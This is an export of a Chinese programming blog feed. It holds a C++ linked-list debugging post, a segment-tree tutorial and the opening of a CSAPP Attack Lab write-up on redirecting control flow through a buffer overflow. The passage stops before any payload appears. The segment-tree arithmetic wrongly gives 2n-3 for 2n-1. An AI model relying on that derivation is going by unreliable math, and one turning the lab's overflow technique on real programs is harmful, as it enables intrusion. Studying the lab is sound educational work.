	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> order <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token class-name">TreeNode</span><span class="token double-colon punctuation">::</span><span class="token function">createTreeByOrder</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">func</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">TreeNode</span><span class="token double-colon punctuation">::</span><span class="token function">orderTraversalWithNull</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>链表连接出错</title>
    <url>/2021/08/31/%E9%93%BE%E8%A1%A8%E8%BF%9E%E6%8E%A5%E5%87%BA%E9%94%99/</url>
    <content><![CDATA[<p>太久没接触数据结构了，导致链表这一块的内容有点生疏了，这两天在做一道链表相关的题时出现了一点问题，在此记录一下以免之后再犯。</p>
<span id="more"></span>

<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/add-two-numbers/">两数相加</a></p>
<h2 id="链表定义"><a href="#链表定义" class="headerlink" title="链表定义"></a>链表定义</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">ListNode</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">int</span> val<span class="token punctuation">;</span>
     ListNode <span class="token operator">*</span>next<span class="token punctuation">;</span>
     <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
     <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
     <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> ListNode <span class="token operator">*</span>next<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>本题很常规，两链表相应位相加得到新链表对应位的值。首先要创建两个个空指针，一个作为新链表的头节点，指向两数相加结果的第一位；一个用以指向链表的子节点，并为其赋值两链表对应位的值相加的结果，最后返回头节点。</p>
<h2 id="错误代码"><a href="#错误代码" class="headerlink" title="错误代码"></a>错误代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    ListNode<span class="token operator">*</span> <span class="token function">addTwoNumbers</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> l1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> l2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> headNode <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
        ListNode<span class="token operator">*</span> pathNode <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">&amp;&amp;</span> l2<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> sum <span class="token operator">=</span> l1<span class="token operator">-></span>val <span class="token operator">+</span> l2<span class="token operator">-></span>val <span class="token operator">+</span> c<span class="token punctuation">;</span>
            c <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>
            pathNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>headNode<span class="token punctuation">)</span>
                headNode <span class="token operator">=</span> pathNode<span class="token punctuation">;</span>
            pathNode <span class="token operator">=</span> pathNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            l1 <span class="token operator">=</span> l1<span class="token operator">-></span>next<span class="token punctuation">;</span>
            l2 <span class="token operator">=</span> l2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>l1<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> sum <span class="token operator">=</span> l1<span class="token operator">-></span>val <span class="token operator">+</span> c<span class="token punctuation">;</span>
            c <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>
            pathNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pathNode <span class="token operator">=</span> pathNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>l2<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> sum <span class="token operator">=</span> l2<span class="token operator">-></span>val <span class="token operator">+</span> c<span class="token punctuation">;</span>
            c <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>
            pathNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pathNode <span class="token operator">=</span> pathNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span>
        	pathNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> headNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<p>代码乍一看好像没有问题，headNode在指向最初的pathNode后就没有再变更，pathNode也是在每次生成新节点后指向它的子节点，但最后测试得到的结果表明headNode为一个孤立的节点（它的子节点为空指针）。</p>
<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>原来在生成子节点的过程中，我先让pathNode指向它的子节点（此时pathNode子节点为nullptr），然后再让其指向新的节点，这样问题就出现了。</p>
<p>因为在pathNode子节点为nullptr的时候指向它是没有任何意义的，在随后的 <code>pathNode = new ListNode(sum % 10);</code>中pathNode又指向了一个动态创建的地址，这个地址与原先的pathNode根本没有任何联系，最后得到的结果只能是前一个pathNode结点的子节点仍然为nullptr。正确的做法应该是先对pathNode的子节点赋值，再执行<code>pathNode = pathNode-&gt;next;</code></p>
<h2 id="正确代码"><a href="#正确代码" class="headerlink" title="正确代码"></a>正确代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    ListNode<span class="token operator">*</span> <span class="token function">addTwoNumbers</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> l1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> l2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> headNode <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
        ListNode<span class="token operator">*</span> pathNode <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">&amp;&amp;</span> l2<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> sum <span class="token operator">=</span> l1<span class="token operator">-></span>val <span class="token operator">+</span> l2<span class="token operator">-></span>val <span class="token operator">+</span> c<span class="token punctuation">;</span>
            c <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>headNode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                pathNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                headNode <span class="token operator">=</span> pathNode<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                pathNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                pathNode <span class="token operator">=</span> pathNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            l1 <span class="token operator">=</span> l1<span class="token operator">-></span>next<span class="token punctuation">;</span>
            l2 <span class="token operator">=</span> l2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>l1<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> sum <span class="token operator">=</span> l1<span class="token operator">-></span>val <span class="token operator">+</span> c<span class="token punctuation">;</span>
            c <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>
            pathNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pathNode <span class="token operator">=</span> pathNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            l1 <span class="token operator">=</span> l1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>l2<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> sum <span class="token operator">=</span> l2<span class="token operator">-></span>val <span class="token operator">+</span> c<span class="token punctuation">;</span>
            c <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>
            pathNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pathNode <span class="token operator">=</span> pathNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            l2 <span class="token operator">=</span> l2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
            pathNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> headNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>经验</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>高效的区间二叉搜索树：线段树</title>
    <url>/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/</url>
    <content><![CDATA[<p>与树状数组类似，线段树也是一种用来维护区间信息的数据结构，可以在对数时间复杂度内实现更新和查询等操作。但相较于树状数组多用于前缀和查询不同，线段树的应用范围更为广泛，例如区间最值等问题，代价是需要消耗更多的存储空间。</p>
<span id="more"></span>

<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>对于一个长度为 7 的数组，根据该数组 nums 元素建立的线段树结构如下图所示。</p>
<p>每个结点存储的值为区间 <code>nums[L ~ R]</code> 的元素和，其中根节点对应的 L = 0, R = 6，即整个数组的元素和。然后每一层的结点将区间均分为 <code>[L, (L + R) / 2]</code> 和 <code>[(L + R) / 2 + 1, R]</code> 两部分。注意按此方式进行划分，得到的两个子区间始终满足：左右区间长度分别为 len1 和 len2，且 <code>len1 == len2 || len1 == len2 + 1</code>。不难得知：这样的结构构成一个<strong>完全二叉树</strong>，因此使用顺序存储将会变得很方便：根节点下标为 0；对于每个下标为 idx 的结点，其左孩子下标为 <code>2 * idx + 1</code>，右孩子下标为 <code>2 * idx + 2</code>。</p>
<p><img src="/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/tree.jpg"></p>
<h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>由于叶子结点的 L 和 R 相等，其值正好为 <code>nums[L]</code>，而每个父结点的值为其两个子结点的值之和，因此可以利用动态规划的思想，先将每个叶子结点的值求出，再依次求出其对应的父结点的值，最终完成线段树的建立。</p>
<p>有一个值得注意的细节就是关于线段树数组 tree 的长度问题。若线段树正好构成一个<strong>满二叉树</strong>，那么树的深度（令根结点深度为 1）为 logm + 1（m 为 nums 长度，正好为 2 的幂），则当 nums 的长度为 n （n 为任意正整数）时，树的深度为 ⌈logn⌉ + 1. </p>
<p>若给树最底层的空结点也分配空间，则结点总数 cnt = 2<sup>⌈logn⌉ + 1</sup> - 1.</p>
<p>令 n = 2<sup>x</sup>，有 cnt = 2 * 2<sup>x</sup> - 1 = 2 * n - 3.</p>
<p>令 n = 2<sup>x</sup> + 1，有 cnt = 4 * 2<sup>x</sup> - 1 = 4 * n - 5.</p>
<p>可见始终有 cnt &lt; 4 * n，因此为了方便起见，通常情况下直接令 tree 的长度为 4 * n.</p>
<h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><p>查询区间 <code>nums[p ~ q]</code> 的元素和时，若正好可以查询到当前结点 node 对应的区间为 <code>[L, R]</code> 且有 <code>L == p &amp;&amp; R == q</code>，那么此时的 <code>tree[node]</code> 即为所要查找的区间和，直接返回即可；</p>
<p>否则可将其进行拆分为两个子区间，查找这两个子区间的值，将其求和后返回。如需要查找 <code>nums[2 ~ 4]</code> 的元素和，可将其划分为 <code>nums[2 ~ 3] + nums[4 ~ 4]</code>，分别在根节点的左右两个子树中查找。</p>
<h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h1><p>更新与构造做法类似，同样是先修改叶子节点，再依次向上修改。</p>
<p>不同之处在于更新每次只需要处理一个分支，时间开销 T(n) = T(n / 2) + O(1)，时间复杂度为 O(logn)；而构造时左右子树均需要处理，时间开销 T(n) = 2 * T(n / 2) + O(1)，时间复杂度为 O(n).</p>
<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">segmentTree</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
	<span class="token keyword">int</span> n<span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> tree<span class="token punctuation">;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	<span class="token function">segmentTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">n</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">tree</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> build <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">;</span>
				<span class="token keyword">return</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
			<span class="token function">build</span><span class="token punctuation">(</span>node <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">build</span><span class="token punctuation">(</span>node <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
			tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
		<span class="token function">build</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">changeVal</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> change <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
				<span class="token keyword">return</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">change</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
				<span class="token function">change</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
		<span class="token function">change</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">int</span> <span class="token function">rangeSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		function<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> range <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">int</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> low <span class="token operator">&amp;&amp;</span> r <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">></span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">range</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Attack Lab</title>
    <url>/2024/09/25/CSAPP-Attack-Lab/</url>
    <content><![CDATA[<p>个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 <strong>缓冲区溢出漏洞</strong> 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。</p>
<span id="more"></span>

<p>这个 Lab 上手便给了我当头一棒，在环境配置上琢磨了好一阵。直接运行 <code>./ctarget -q</code> ，程序没有让进行输入，而是直接触发了段错误，后来尝试在跑在学校的 Linux 服务器上得以正常运行，原因不明，推测是 WSL 的锅？？</p>
<p><img src="/2024/09/25/CSAPP-Attack-Lab/err.png"></p>
<h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>在倒腾好环境之后，终于可以开始着手完成实验了。</p>
<p>phase_1 要求我们在调用 <code>getbuf</code> 读取标准输入后，不返回到 <code>test</code> 函数接着执行 <code>printf</code>，而是转而执行 <code>touch1</code>.</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> val<span class="token punctuation">;</span>
    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
